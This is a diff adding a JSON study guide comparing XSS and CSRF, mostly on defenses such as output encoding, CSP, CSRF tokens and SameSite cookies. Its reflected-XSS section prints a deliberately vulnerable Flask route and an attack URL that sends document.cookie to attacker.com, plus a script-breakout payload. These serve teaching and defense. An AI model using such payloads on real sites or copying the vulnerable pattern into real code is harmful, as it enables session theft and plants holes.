@@ -1,0 +1,2593 @@
+{
+  "id": "n4dfdec1f38aeba4",
+  "title": "XSS vs CSRF",
+  "markdown": "Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two of the most important web application vulnerabilities that every security engineer must understand deeply. Despite both having \"cross-site\" in their names, they exploit fundamentally different trust relationships and require entirely different defense strategies.\n\n**Why understanding the difference matters:**\n\n- These are among the most frequently asked security interview questions - and the most commonly confused\n- Misunderstanding the distinction leads to misapplied defenses (e.g., thinking SameSite cookies fix XSS)\n- Both appear in the OWASP Top 10 and are consistently found in real-world assessments\n- A mature security engineer must be able to articulate not just *what* each attack does, but *why* they work, how they interact, and which defenses apply to which threat\n\n**The core trust distinction:**\n\n- **XSS** exploits the **user's trust in a website** - the browser executes malicious code because it trusts content served from a legitimate origin\n- **CSRF** exploits the **website's trust in the user's browser** - the server processes a request because it trusts the authenticated session cookie the browser automatically attaches\n\nThis single insight - that XSS and CSRF exploit trust in *opposite directions* - is the foundation for understanding everything else in this guide.",
+  "notes": "Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two of the most important web application vulnerabilities that every security engineer must understand deeply. Despite both having \"cross-site\" in their names, they exploit fundamentally different trust relationships and require entirely different defense strategies.\n\nWhy understanding the difference matters:\n- These are among the most frequently asked security interview questions - and the most commonly confused\n- Misunderstanding the distinction leads to misapplied defenses (e.g., thinking SameSite cookies fix XSS)\n- Both appear in the OWASP Top 10 and are consistently found in real-world assessments\n- A mature security engineer must be able to articulate not just what each attack does, but why they work, how they interact, and which defenses apply to which threat\n\nThe core trust distinction:\n- XSS exploits the user's trust in a website - the browser executes malicious code because it trusts content served from a legitimate origin\n- CSRF exploits the website's trust in the user's browser - the server processes a request because it trusts the authenticated session cookie the browser automatically attaches\n\nThis single insight - that XSS and CSRF exploit trust in opposite directions - is the foundation for understanding everything else in this guide.",
+  "expanded": true,
+  "children": [
+    {
+      "id": "n3f8bda2383488d5",
+      "title": "Defense Mechanisms Comparison",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n7eaab1cb830e235",
+          "title": "XSS Defenses",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n4dec270eb495f19",
+              "title": "Output Encoding (Primary Defense)",
+              "markdown": "Context-dependent encoding is the most critical XSS defense. The encoding must match the context where the data is being inserted.\n\n| Context | Encoding Required | Example |\n|---------|------------------|---------|\n| HTML body | HTML entity encoding | `<` -> `&lt;` |\n| HTML attribute | Attribute encoding | `\"` -> `&quot;` |\n| JavaScript | JavaScript encoding | `'` -> `\\x27` |\n| URL parameter | URL encoding | `<` -> `%3C` |\n| CSS | CSS encoding | `(` -> `\\28` |\n\n```python\n# Context-dependent encoding example (Python)\nfrom markupsafe import escape\nimport urllib.parse\nimport json\n\nuser_input = request.args.get('name')\n\n# HTML context\nhtml_safe = escape(user_input)  # <script> -> &lt;script&gt;\n\n# URL context\nurl_safe = urllib.parse.quote(user_input, safe='')\n\n# JavaScript context (embedding in a script block)\njs_safe = json.dumps(user_input)  # Produces a safely quoted string\n\n# WRONG: Using HTML encoding in JavaScript context\n# <script>var name = '&#123;&#123; html_escape(user_input) &#125;&#125;';</script>\n# An attacker can break out with: ';alert(1);//\n```",
+              "notes": "Context-dependent encoding is the most critical XSS defense. The encoding must match the context where the data is being inserted.\n\n| Context | Encoding Required | Example |\n|---------|------------------|---------|\n| HTML body | HTML entity encoding | < -> &lt; |\n| HTML attribute | Attribute encoding | \" -> &quot; |\n| JavaScript | JavaScript encoding | ' -> \\x27 |\n| URL parameter | URL encoding | < -> %3C |\n| CSS | CSS encoding | ( -> \\28 |\n\nContext-dependent encoding example (Python)\nfrom markupsafe import escape\nimport urllib.parse\nimport json\n\nuserinput = request.args.get('name')\n\nHTML context\nhtmlsafe = escape(userinput)  # <script> -> &lt;script&gt;\n\nURL context\nurlsafe = urllib.parse.quote(userinput, safe='')\n\nJavaScript context (embedding in a script block)\njssafe = json.dumps(userinput)  # Produces a safely quoted string\n\nWRONG: Using HTML encoding in JavaScript context\n<script>var name = '&#123;&#123; htmlescape(userinput) &#125;&#125;';</script>\nAn attacker can break out with: ';alert(1);//",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "Context-dependent encoding is the most critical XSS defense.",
+              "expanded": false
+            },
+            {
+              "id": "nfbe33a3cfce60ef",
+              "title": "Content Security Policy (CSP)",
+              "markdown": "CSP provides a defense-in-depth layer that limits what injected scripts can do even if XSS occurs.\n\n```\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-r4nd0m123';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https:;\n  connect-src 'self' https://api.example.com;\n  object-src 'none';\n  base-uri 'self';\n  form-action 'self'\n```\n\n**CSP with strict-dynamic** for modern applications:\n\n```\nContent-Security-Policy:\n  script-src 'nonce-r4nd0m123' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'self'\n```\n\n`strict-dynamic` propagates trust to scripts loaded by already-trusted scripts, simplifying CSP for applications that dynamically load modules.",
+              "notes": "CSP provides a defense-in-depth layer that limits what injected scripts can do even if XSS occurs.\n\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-r4nd0m123';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' data: https:;\n  connect-src 'self' https://api.example.com;\n  object-src 'none';\n  base-uri 'self';\n  form-action 'self'\n\nCSP with strict-dynamic for modern applications:\n\nContent-Security-Policy:\n  script-src 'nonce-r4nd0m123' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'self'\n\nstrict-dynamic propagates trust to scripts loaded by already-trusted scripts, simplifying CSP for applications that dynamically load modules.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "CSP provides a defense-in-depth layer that limits what injected scripts can...",
+              "expanded": false
+            },
+            {
+              "id": "n345bbf8cbf273d5",
+              "title": "Trusted Types API",
+              "markdown": "A newer browser API that enforces type-safe DOM manipulation, preventing DOM XSS at the browser level.\n\n```javascript\n// Enforce Trusted Types via CSP\n// Content-Security-Policy: require-trusted-types-for 'script'\n\n// Create a policy\nconst sanitizePolicy = trustedTypes.createPolicy('sanitize', {\n    createHTML: (input) => DOMPurify.sanitize(input),\n    createScript: (input) => { throw new Error('Scripts not allowed'); },\n    createScriptURL: (input) => {\n        const url = new URL(input, document.baseURI);\n        if (url.origin === location.origin) return url.href;\n        throw new Error('Untrusted script URL: ' + input);\n    }\n});\n\n// Now innerHTML requires a TrustedHTML object\nelement.innerHTML = sanitizePolicy.createHTML(userInput);  // Safe\nelement.innerHTML = userInput;  // Throws TypeError\n```",
+              "notes": "A newer browser API that enforces type-safe DOM manipulation, preventing DOM XSS at the browser level.\n\n// Enforce Trusted Types via CSP\n// Content-Security-Policy: require-trusted-types-for 'script'\n\n// Create a policy\nconst sanitizePolicy = trustedTypes.createPolicy('sanitize', {\n    createHTML: (input) => DOMPurify.sanitize(input),\n    createScript: (input) => { throw new Error('Scripts not allowed'); },\n    createScriptURL: (input) => {\n        const url = new URL(input, document.baseURI);\n        if (url.origin === location.origin) return url.href;\n        throw new Error('Untrusted script URL: ' + input);\n    }\n});\n\n// Now innerHTML requires a TrustedHTML object\nelement.innerHTML = sanitizePolicy.createHTML(userInput);  // Safe\nelement.innerHTML = userInput;  // Throws TypeError",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "A newer browser API that enforces type-safe DOM manipulation, preventing DOM...",
+              "expanded": false
+            },
+            {
+              "id": "n2980b81a8137b8d",
+              "title": "Framework-Level Protections",
+              "markdown": "Modern frameworks provide automatic encoding by default:",
+              "notes": "Modern frameworks provide automatic encoding by default:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "nacb479e8a991a33",
+                  "title": "React: Auto-escapes JSX expressions. Dangerous: dangerouslySetInnerHTML",
+                  "markdown": "- React: Auto-escapes JSX expressions. Dangerous: dangerouslySetInnerHTML",
+                  "notes": "React: Auto-escapes JSX expressions. Dangerous: dangerouslySetInnerHTML",
+                  "blurb": "React: Auto-escapes JSX expressions.",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nff1fa7d8b5f3e69",
+                  "title": "Angular: Auto-sanitizes bindings. Dangerous: bypassSecurityTrustHtml()",
+                  "markdown": "- Angular: Auto-sanitizes bindings. Dangerous: bypassSecurityTrustHtml()",
+                  "notes": "Angular: Auto-sanitizes bindings. Dangerous: bypassSecurityTrustHtml()",
+                  "blurb": "Angular: Auto-sanitizes bindings.",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc391240aaa51da5",
+                  "title": "Vue: Auto-escapes `&#123;&#123; &#125;&#125; interpolation. Dangerous: v-html` directive",
+                  "markdown": "- Vue: Auto-escapes `&#123;&#123; &#125;&#125; interpolation. Dangerous: v-html` directive",
+                  "notes": "Vue: Auto-escapes `&#123;&#123; &#125;&#125; interpolation. Dangerous: v-html` directive",
+                  "blurb": "Vue: Auto-escapes &#123;&#123; &#125;&#125; interpolation.",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Modern frameworks provide automatic encoding by default:",
+              "expanded": false
+            },
+            {
+              "id": "n0d9e4267fa3078b",
+              "title": "HttpOnly Cookies",
+              "markdown": "Does **not prevent XSS** but limits the impact by making session cookies inaccessible to JavaScript.\n\n```\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax\n```\n\n**Limitation:** An attacker with XSS can still perform actions as the user by making fetch/XHR requests - they just can't steal the cookie value and use it from another machine.",
+              "notes": "Does not prevent XSS but limits the impact by making session cookies inaccessible to JavaScript.\n\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax\n\nLimitation: An attacker with XSS can still perform actions as the user by making fetch/XHR requests - they just can't steal the cookie value and use it from another machine.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "Does not prevent XSS but limits the impact by making session cookies...",
+              "expanded": false
+            },
+            {
+              "id": "n51b9892ebf622d1",
+              "title": "Input Validation and Sanitization",
+              "markdown": "A supplementary defense - never the primary one.\n\n```python\nimport bleach\n\n# Whitelist-based HTML sanitization\nallowed_tags = ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li']\nallowed_attrs = {'a': ['href', 'title']}\nclean_html = bleach.clean(\n    user_html,\n    tags=allowed_tags,\n    attributes=allowed_attrs,\n    strip=True\n)\n```",
+              "notes": "A supplementary defense - never the primary one.\n\nimport bleach\n\nWhitelist-based HTML sanitization\nallowedtags = ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li']\nallowedattrs = {'a': ['href', 'title']}\ncleanhtml = bleach.clean(\n    userhtml,\n    tags=allowedtags,\n    attributes=allowedattrs,\n    strip=True\n)",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "A supplementary defense - never the primary one.",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Output Encoding (Primary Defense)",
+          "expanded": false
+        },
+        {
+          "id": "n98f2d84a21266ad",
+          "title": "CSRF Defenses",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n7939dac89ef63b7",
+              "title": "Synchronizer Token Pattern (Primary Defense)",
+              "markdown": "The server generates a unique, unpredictable token tied to the user's session and embeds it in every state-changing form. The server validates the token on submission.\n\n```python\n# Server-side token generation (Flask example)\nimport secrets\n\n@app.before_request\ndef generate_csrf_token():\n    if 'csrf_token' not in session:\n        session['csrf_token'] = secrets.token_hex(32)\n\n# Template\n# <form method=\"POST\" action=\"/transfer\">\n#   <input type=\"hidden\" name=\"csrf_token\" value=\"&#123;&#123; session.csrf_token &#125;&#125;\">\n#   ...\n# </form>\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    token = request.form.get('csrf_token')\n    if not token or token != session.get('csrf_token'):\n        abort(403, 'CSRF token validation failed')\n    # Process the transfer\n```\n\n**Why it works:** The attacker cannot read the token because same-origin policy prevents cross-origin reads. Without the valid token, the forged request is rejected.",
+              "notes": "The server generates a unique, unpredictable token tied to the user's session and embeds it in every state-changing form. The server validates the token on submission.\n\nServer-side token generation (Flask example)\nimport secrets\n\n@app.beforerequest\ndef generatecsrftoken():\n    if 'csrftoken' not in session:\n        session['csrftoken'] = secrets.tokenhex(32)\n\nTemplate\n<form method=\"POST\" action=\"/transfer\">\n<input type=\"hidden\" name=\"csrftoken\" value=\"&#123;&#123; session.csrftoken &#125;&#125;\">\n...\n</form>\n\n@app.route('/transfer', methods=['POST'])\ndef transfer():\n    token = request.form.get('csrftoken')\n    if not token or token != session.get('csrftoken'):\n        abort(403, 'CSRF token validation failed')\n    # Process the transfer\n\nWhy it works: The attacker cannot read the token because same-origin policy prevents cross-origin reads. Without the valid token, the forged request is rejected.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "The server generates a unique, unpredictable token tied to the user's...",
+              "expanded": false
+            },
+            {
+              "id": "ndcdb9952dedd7de",
+              "title": "Double Submit Cookie Pattern",
+              "markdown": "An alternative when server-side state is difficult (e.g., stateless APIs). The token is stored in both a cookie and a request parameter; the server checks they match.\n\n```javascript\n// Client-side: read token from cookie and include in request header\nfunction getCookie(name) {\n    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));\n    return match ? match[2] : null;\n}\n\nfetch('/api/transfer', {\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json',\n        'X-CSRF-Token': getCookie('csrf_token')\n    },\n    body: JSON.stringify({ amount: 100, to: 'recipient' })\n});\n```\n\n```python\n# Server-side validation\n@app.route('/api/transfer', methods=['POST'])\ndef transfer():\n    cookie_token = request.cookies.get('csrf_token')\n    header_token = request.headers.get('X-CSRF-Token')\n    if not cookie_token or cookie_token != header_token:\n        abort(403, 'CSRF validation failed')\n    # Process request\n```\n\n**Why it works:** An attacker can cause the browser to *send* the cookie, but cannot *read* it (same-origin policy), so they can't duplicate the value in the request header.\n\n**Weakness:** If an attacker can set cookies on the target domain (e.g., via a subdomain XSS or cookie injection), they can bypass this defense. Use `__Host-` cookie prefix to mitigate:\n\n```\nSet-Cookie: __Host-csrf=token123; Secure; Path=/; SameSite=Lax\n```",
+              "notes": "An alternative when server-side state is difficult (e.g., stateless APIs). The token is stored in both a cookie and a request parameter; the server checks they match.\n\n// Client-side: read token from cookie and include in request header\nfunction getCookie(name) {\n    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));\n    return match ? match[2] : null;\n}\n\nfetch('/api/transfer', {\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json',\n        'X-CSRF-Token': getCookie('csrftoken')\n    },\n    body: JSON.stringify({ amount: 100, to: 'recipient' })\n});\n\nServer-side validation\n@app.route('/api/transfer', methods=['POST'])\ndef transfer():\n    cookietoken = request.cookies.get('csrftoken')\n    headertoken = request.headers.get('X-CSRF-Token')\n    if not cookietoken or cookietoken != headertoken:\n        abort(403, 'CSRF validation failed')\n    # Process request\n\nWhy it works: An attacker can cause the browser to send the cookie, but cannot read it (same-origin policy), so they can't duplicate the value in the request header.\n\nWeakness: If an attacker can set cookies on the target domain (e.g., via a subdomain XSS or cookie injection), they can bypass this defense. Use Host- cookie prefix to mitigate:\n\nSet-Cookie: Host-csrf=token123; Secure; Path=/; SameSite=Lax",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "An alternative when server-side state is difficult (e.g., stateless APIs).",
+              "expanded": false
+            },
+            {
+              "id": "n3cec34f669792e7",
+              "title": "SameSite Cookie Attribute",
+              "markdown": "Instructs the browser to restrict when cookies are sent in cross-site requests.\n\n| Value | Behavior | CSRF Protection |\n|-------|----------|-----------------|\n| `Strict` | Cookie never sent on cross-site requests | Strong - but breaks inbound links (user appears logged out) |\n| `Lax` | Cookie sent on top-level navigations (GET) but not cross-site POST/iframe/AJAX | Good - protects POST-based CSRF; GET actions still vulnerable |\n| `None` | Cookie always sent (requires `Secure`) | None |\n\n```\nSet-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly\n```\n\n**Important:** `SameSite=Lax` is now the default in modern browsers (Chrome, Edge, Firefox). This has dramatically reduced CSRF risk for applications that properly use POST for state-changing operations.",
+              "notes": "Instructs the browser to restrict when cookies are sent in cross-site requests.\n\n| Value | Behavior | CSRF Protection |\n|-------|----------|-----------------|\n| Strict | Cookie never sent on cross-site requests | Strong - but breaks inbound links (user appears logged out) |\n| Lax | Cookie sent on top-level navigations (GET) but not cross-site POST/iframe/AJAX | Good - protects POST-based CSRF; GET actions still vulnerable |\n| None | Cookie always sent (requires Secure) | None |\n\nSet-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly\n\nImportant: SameSite=Lax is now the default in modern browsers (Chrome, Edge, Firefox). This has dramatically reduced CSRF risk for applications that properly use POST for state-changing operations.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "Instructs the browser to restrict when cookies are sent in cross-site...",
+              "expanded": false
+            },
+            {
+              "id": "n06ca603fd68d577",
+              "title": "Custom Request Headers",
+              "markdown": "Require a custom header on state-changing requests. Custom headers on cross-origin requests trigger a CORS preflight, which will be denied if CORS is not configured to allow the attacker's origin.\n\n```javascript\n// Client-side\nfetch('/api/settings', {\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json',\n        'X-Requested-With': 'XMLHttpRequest'\n    },\n    body: JSON.stringify(data)\n});\n```\n\n```python\n# Server-side\n@app.route('/api/settings', methods=['POST'])\ndef update_settings():\n    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':\n        abort(403, 'Missing custom header')\n    # Process request\n```\n\n**Why it works:** HTML forms cannot set custom headers. JavaScript from a cross-origin page cannot set custom headers without CORS preflight approval.",
+              "notes": "Require a custom header on state-changing requests. Custom headers on cross-origin requests trigger a CORS preflight, which will be denied if CORS is not configured to allow the attacker's origin.\n\n// Client-side\nfetch('/api/settings', {\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json',\n        'X-Requested-With': 'XMLHttpRequest'\n    },\n    body: JSON.stringify(data)\n});\n\nServer-side\n@app.route('/api/settings', methods=['POST'])\ndef updatesettings():\n    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':\n        abort(403, 'Missing custom header')\n    # Process request\n\nWhy it works: HTML forms cannot set custom headers. JavaScript from a cross-origin page cannot set custom headers without CORS preflight approval.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "Require a custom header on state-changing requests.",
+              "expanded": false
+            },
+            {
+              "id": "n5d14ec4bbc6d074",
+              "title": "Origin/Referer Header Validation",
+              "markdown": "Check the `Origin` or `Referer` header to verify the request came from the expected origin.\n\n```python\nALLOWED_ORIGINS = {'https://app.example.com', 'https://www.example.com'}\n\n@app.before_request\ndef validate_origin():\n    if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):\n        origin = request.headers.get('Origin')\n        referer = request.headers.get('Referer')\n\n        if origin:\n            if origin not in ALLOWED_ORIGINS:\n                abort(403, 'Invalid origin')\n        elif referer:\n            from urllib.parse import urlparse\n            parsed = urlparse(referer)\n            referer_origin = f\"{parsed.scheme}://{parsed.netloc}\"\n            if referer_origin not in ALLOWED_ORIGINS:\n                abort(403, 'Invalid referer')\n        else:\n            # No origin or referer - can happen with privacy extensions\n            # Decision: block (safer) or allow (more compatible)\n            abort(403, 'Missing origin information')\n```\n\n**Caveats:**",
+              "notes": "Check the Origin or Referer header to verify the request came from the expected origin.\n\nALLOWEDORIGINS = {'https://app.example.com', 'https://www.example.com'}\n\n@app.beforerequest\ndef validateorigin():\n    if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):\n        origin = request.headers.get('Origin')\n        referer = request.headers.get('Referer')\n\n        if origin:\n            if origin not in ALLOWEDORIGINS:\n                abort(403, 'Invalid origin')\n        elif referer:\n            from urllib.parse import urlparse\n            parsed = urlparse(referer)\n            refererorigin = f\"{parsed.scheme}://{parsed.netloc}\"\n            if refererorigin not in ALLOWEDORIGINS:\n                abort(403, 'Invalid referer')\n        else:\n            # No origin or referer - can happen with privacy extensions\n            # Decision: block (safer) or allow (more compatible)\n            abort(403, 'Missing origin information')\n\nCaveats:",
+              "kind": "topic",
+              "level": 4,
+              "children": [
+                {
+                  "id": "n0c2c4bfe687f78f",
+                  "title": "Some browsers/proxies strip Referer headers",
+                  "markdown": "- Some browsers/proxies strip Referer headers",
+                  "notes": "Some browsers/proxies strip Referer headers",
+                  "blurb": "Some browsers/proxies strip Referer headers",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "ncc273e75d6e9eba",
+                  "title": "Privacy extensions may suppress Origin",
+                  "markdown": "- Privacy extensions may suppress Origin",
+                  "notes": "Privacy extensions may suppress Origin",
+                  "blurb": "Privacy extensions may suppress Origin",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "ne4c96144b195cf0",
+                  "title": "Should be a supplementary defense, not the sole protection",
+                  "markdown": "- Should be a supplementary defense, not the sole protection",
+                  "notes": "Should be a supplementary defense, not the sole protection",
+                  "blurb": "Should be a supplementary defense, not the sole protection",
+                  "kind": "topic",
+                  "level": 5,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Check the Origin or Referer header to verify the request came from the...",
+              "expanded": false
+            },
+            {
+              "id": "n61f0b23f827d316",
+              "title": "Re-authentication for Sensitive Actions",
+              "markdown": "For high-impact operations, require the user to re-enter their password or complete a second factor.\n\n```python\n@app.route('/change-password', methods=['POST'])\ndef change_password():\n    # Require current password even though user is authenticated\n    current_password = request.form.get('current_password')\n    if not verify_password(current_user, current_password):\n        abort(403, 'Current password verification failed')\n    # Process password change\n```\n\nThis defeats both CSRF (attacker doesn't know current password) and session hijacking.",
+              "notes": "For high-impact operations, require the user to re-enter their password or complete a second factor.\n\n@app.route('/change-password', methods=['POST'])\ndef changepassword():\n    # Require current password even though user is authenticated\n    currentpassword = request.form.get('currentpassword')\n    if not verifypassword(currentuser, currentpassword):\n        abort(403, 'Current password verification failed')\n    # Process password change\n\nThis defeats both CSRF (attacker doesn't know current password) and session hijacking.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "For high-impact operations, require the user to re-enter their password or...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Synchronizer Token Pattern (Primary Defense)",
+          "expanded": false
+        },
+        {
+          "id": "n8a532afd3e00b2d",
+          "title": "Which Defenses Overlap",
+          "markdown": "Understanding which defenses apply to which attack is critical for interview discussions:\n\n| Defense | Helps with XSS? | Helps with CSRF? | Notes |\n|---------|:---:|:---:|-------|\n| Output encoding | **Yes** (primary) | No | Prevents script injection at the source |\n| CSP | **Yes** (defense-in-depth) | No | Limits what injected scripts can do |\n| Trusted Types | **Yes** (DOM XSS) | No | Enforces type-safe DOM manipulation |\n| HttpOnly cookies | Partially (limits impact) | No | Prevents cookie theft but not XSS actions |\n| CSRF tokens | No | **Yes** (primary) | Validates request authenticity |\n| SameSite cookies | No | **Yes** | Restricts cross-site cookie sending |\n| Custom headers | No | **Yes** | Triggers CORS preflight for cross-origin |\n| Origin validation | No | **Yes** (supplementary) | Verifies request source |\n| Input validation | Partially | Partially | Defense-in-depth for both |\n| Re-authentication | No | **Yes** (high-value ops) | Additional verification layer |\n\n**Key insight:** There is almost zero overlap. You need **both sets of defenses** deployed together. Implementing only CSRF protections leaves you vulnerable to XSS, and vice versa.",
+          "notes": "Understanding which defenses apply to which attack is critical for interview discussions:\n\n| Defense | Helps with XSS? | Helps with CSRF? | Notes |\n|---------|:---:|:---:|-------|\n| Output encoding | Yes (primary) | No | Prevents script injection at the source |\n| CSP | Yes (defense-in-depth) | No | Limits what injected scripts can do |\n| Trusted Types | Yes (DOM XSS) | No | Enforces type-safe DOM manipulation |\n| HttpOnly cookies | Partially (limits impact) | No | Prevents cookie theft but not XSS actions |\n| CSRF tokens | No | Yes (primary) | Validates request authenticity |\n| SameSite cookies | No | Yes | Restricts cross-site cookie sending |\n| Custom headers | No | Yes | Triggers CORS preflight for cross-origin |\n| Origin validation | No | Yes (supplementary) | Verifies request source |\n| Input validation | Partially | Partially | Defense-in-depth for both |\n| Re-authentication | No | Yes (high-value ops) | Additional verification layer |\n\nKey insight: There is almost zero overlap. You need both sets of defenses deployed together. Implementing only CSRF protections leaves you vulnerable to XSS, and vice versa.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Understanding which defenses apply to which attack is critical for interview...",
+          "expanded": false
+        },
+        {
+          "id": "n4a9b3427cd83e84",
+          "title": "Why XSS Defeats CSRF Protections",
+          "markdown": "This deserves its own section because it is one of the most important security concepts:",
+          "notes": "This deserves its own section because it is one of the most important security concepts:",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n093eb4876ccb528",
+              "title": "CSRF tokens become useless - XSS script on the same origin can read tokens from forms, m",
+              "markdown": "- CSRF tokens become useless - XSS script on the same origin can read tokens from forms, m",
+              "notes": "CSRF tokens become useless - XSS script on the same origin can read tokens from forms, m",
+              "blurb": "CSRF tokens become useless - XSS script on the same origin can read tokens...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nfccfeae0ed34b71",
+              "title": "SameSite cookies don't help - The XSS script runs on the *same site*, so all cookies are",
+              "markdown": "- SameSite cookies don't help - The XSS script runs on the *same site*, so all cookies are",
+              "notes": "SameSite cookies don't help - The XSS script runs on the *same site*, so all cookies are",
+              "blurb": "SameSite cookies don't help - The XSS script runs on the same site, so all...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n199db4dd952cd67",
+              "title": "Custom header requirements are bypassed - JavaScript on the same origin can set any head",
+              "markdown": "- Custom header requirements are bypassed - JavaScript on the same origin can set any head",
+              "notes": "Custom header requirements are bypassed - JavaScript on the same origin can set any head",
+              "blurb": "Custom header requirements are bypassed - JavaScript on the same origin can...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n3ed66e6cee7586b",
+              "title": "Origin/Referer validation passes - Requests from XSS originate from the legitimate origi",
+              "markdown": "- Origin/Referer validation passes - Requests from XSS originate from the legitimate origi",
+              "notes": "Origin/Referer validation passes - Requests from XSS originate from the legitimate origi",
+              "blurb": "Origin/Referer validation passes - Requests from XSS originate from the...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n206630ca4f048c6",
+              "title": "Double-submit cookies are defeated - XSS can read cookies via document.cookie and duplic",
+              "markdown": "- Double-submit cookies are defeated - XSS can read cookies via document.cookie and duplic",
+              "notes": "Double-submit cookies are defeated - XSS can read cookies via document.cookie and duplic",
+              "blurb": "Double-submit cookies are defeated - XSS can read cookies via...",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "This deserves its own section because it is one of the most important...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes XSS Defenses",
+      "expanded": true
+    },
+    {
+      "id": "neb1640190d675eb",
+      "title": "Attack Mechanics Deep Dive",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n1cf77a749db756e",
+          "title": "XSS Attack Flow",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 3,
+          "children": [
+            {
+              "id": "n9c6bc23af308bf1",
+              "title": "Reflected XSS",
+              "markdown": "The attacker crafts a URL containing malicious JavaScript. The server includes the attacker's input in its response without encoding. When the victim clicks the link, the script executes.\n\n**Flow:** Attacker crafts URL -> victim clicks link -> server reflects input in response -> browser executes script in trusted origin\n\n**Realistic example - search functionality:**\n\n```python\n# Vulnerable server code (Flask)\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    results = db.search(query)\n    return f'''\n        <h2>Search results for: {query}</h2>\n        <div>{render_results(results)}</div>\n    '''\n```\n\n**Attack URL:**\n\n```\nhttps://vulnerable.com/search?q=<script>\n  var img = new Image();\n  img.src = 'https://attacker.com/collect?cookie=' + encodeURIComponent(document.cookie);\n</script>\n```\n\n**Delivery:** The attacker sends this URL to the victim via email, chat, or embeds it in a shortened link. When the victim clicks, the server responds with an HTML page containing the script, which the browser executes because it came from `vulnerable.com`.",
+              "notes": "The attacker crafts a URL containing malicious JavaScript. The server includes the attacker's input in its response without encoding. When the victim clicks the link, the script executes.\n\nFlow: Attacker crafts URL -> victim clicks link -> server reflects input in response -> browser executes script in trusted origin\n\nRealistic example - search functionality:\n\nVulnerable server code (Flask)\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    results = db.search(query)\n    return f'''\n        <h2>Search results for: {query}</h2>\n        <div>{renderresults(results)}</div>\n    '''\n\nAttack URL:\n\nhttps://vulnerable.com/search?q=<script>\n  var img = new Image();\n  img.src = 'https://attacker.com/collect?cookie=' + encodeURIComponent(document.cookie);\n</script>\n\nDelivery: The attacker sends this URL to the victim via email, chat, or embeds it in a shortened link. When the victim clicks, the server responds with an HTML page containing the script, which the browser executes because it came from vulnerable.com.",
+              "kind": "topic",
+              "level": 4,
+              "children": [],
+              "blurb": "The attacker crafts a URL containing malicious JavaScript.",
+              "expanded": false
+            },
+            {
+              "id": "ncb7800e94b14bf2",
+              "title": "Stored XSS",
